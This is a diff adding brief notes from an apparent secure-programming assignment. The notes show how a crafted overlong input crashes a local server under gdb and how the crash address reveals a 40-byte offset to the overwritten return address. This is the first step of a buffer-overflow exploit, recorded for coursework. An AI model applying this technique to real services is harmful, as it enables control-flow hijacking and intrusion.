@@ -1,0 +1,30 @@
+In one termina l:
+gdb server
+run
+
+In another one:
+./client
+1
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456789abcedfhijklmnop
+
+
+You will se that in gdb :
+
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/student/Documents/Secure Prog/Assignment/server 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/libthread_db.so.1".
+[New Thread 0xb7dc3b40 (LWP 2833)]
+Au revoir Jimmy
+
+Thread 2 "server" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xb7dc3b40 (LWP 2833)]
+0x61393837 in ?? ()
+(gdb) 
+
+
+0x61393837 is the new return address -> it's a987 -> 879a
+so we can only send aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456789a = 40 bytes and the return address will be the last 4 bytes !
+
